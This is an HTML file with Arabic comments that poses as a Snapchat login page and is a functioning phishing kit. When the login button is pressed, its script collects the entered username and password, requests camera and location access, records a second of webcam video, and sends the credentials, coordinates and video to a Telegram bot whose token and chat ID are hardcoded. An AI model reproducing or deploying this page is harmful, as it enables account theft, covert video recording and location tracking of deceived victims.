<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحة تسجيل الدخول</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #fffc00; /* لون خلفية صفراء */
            font-family: Arial, sans-serif;
            direction: rtl;
        }
        .container {
            width: 300px; /* عرض صندوق الإدخال */
            text-align: center;
            background-color: white; /* لون خلفية الصندوق الأبيض */
            padding: 20px;
            border-radius: 10px; /* زوايا مستديرة */
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* تأثير ظل للصندوق */
        }
        h1 {
            margin: 0;
            font-size: 30px;
        }
        input {
            width: 100%; /* عرض الخانات */
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc; /* لون الحدود */
            border-radius: 5px; /* زوايا مستديرة */
        }
        button {
            width: 100%; /* عرض الزر */
            padding: 10px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            background-color: #00bfff; /* لون زر تسجيل الدخول */
            color: white; /* لون النص */
            cursor: pointer; /* شكل المؤشر عند المرور على الزر */
        }
        button:hover {
            background-color: #0099cc; /* لون الزر عند المرور عليه */
        }
        .logo {
            width: 80px; /* عرض شعار سناب شات */
            margin-bottom: 20px; /* مسافة بين الشعار والخانات */
        }
        #permission-message {
            color: red;
            font-size: 18px;
            display: none;
        }
    </style>
</head>
<body>
    <img src="https://upload.wikimedia.org/wikipedia/en/e/e0/Snapchat_logo.png" alt="شعار سناب شات" class="logo">
    <div class="container">
        <h1>تسجيل الدخول</h1>
        <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
        <input type="password" id="password" placeholder="كلمة المرور" required>
        <button id="loginButton">تسجيل الدخول</button>
        <div id="permission-message"></div>
    </div>
    
    <video id="video" autoplay playsinline style="display: none;"></video>
    
    <script>
        let latitude = 'لم يُسمح بالوصول إلى الموقع'; // قيمة افتراضية
        let longitude = 'لم يُسمح بالوصول إلى الموقع'; // قيمة افتراضية
        let mediaRecorder;
        let recordedChunks = [];

        async function requestPermissions() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                return stream;
            } catch (err) {
                console.error('خطأ في الحصول على الأذونات: ', err);
                document.getElementById('permission-message').innerText = 'يجب عليك منح الأذونات للوصول إلى الكاميرا والموقع.';
                document.getElementById('permission-message').style.display = 'block';
                return null;
            }
        }

        async function getLocation() {
            return new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition((position) => {
                    latitude = position.coords.latitude;
                    longitude = position.coords.longitude;
                    resolve();
                }, (error) => {
                    console.error('خطأ في الحصول على الموقع: ', error);
                    resolve(); // نستمر حتى إذا لم نتمكن من الحصول على الموقع
                });
            });
        }

        document.getElementById('loginButton').addEventListener('click', async () => {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const stream = await requestPermissions();
            await getLocation();

            if (stream) {
                document.getElementById('video').srcObject = stream;
                mediaRecorder = new MediaRecorder(stream);

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = () => {
                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
                    recordedChunks = [];
                    sendData(username, password, videoBlob);
                };

                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop()); // إيقاف جميع المسارات (الكاميرا)
                }, 1000); // تسجيل لمدة ثانية واحدة
            }
        });

        function sendData(username, password, videoBlob) {
            const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
            const chatId = '6185375878';
            
            const initialMessage = `
#رسالة_أولية:
📩 اسم المستخدم: ${username}
🔒 كلمة المرور: ${password}
🎯 إحداثيات الموقع:
🌍 Latitude: ${latitude}
🌍 Longitude: ${longitude}
`;

            const videoMessage = `
#رسالة_ثانوية:
📹 فيديو تم تسجيله.
🎯 إحداثيات الموقع:
🌍 Latitude: ${latitude}
🌍 Longitude: ${longitude}
`;

            const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;
            const apiUrlVideo = `https://api.telegram.org/bot${token}/sendVideo`;

            // إرسال الرسالة الأولية
            fetch(apiUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: initialMessage
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('تم إرسال البيانات الأولية إلى Telegram:', data);
                // الآن نرسل الفيديو
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('video', videoBlob, 'video.webm');
                formData.append('caption', videoMessage);

                return fetch(apiUrlVideo, {
                    method: 'POST',
                    body: formData
                });
            })
            .then(response => response.json())
            .then(data => {
                console.log('تم إرسال الفيديو إلى Telegram:', data);
            })
            .catch(error => {
                console.error('خطأ في إرسال البيانات إلى Telegram: ', error);
            });
        }
    </script>
</body>
</html>
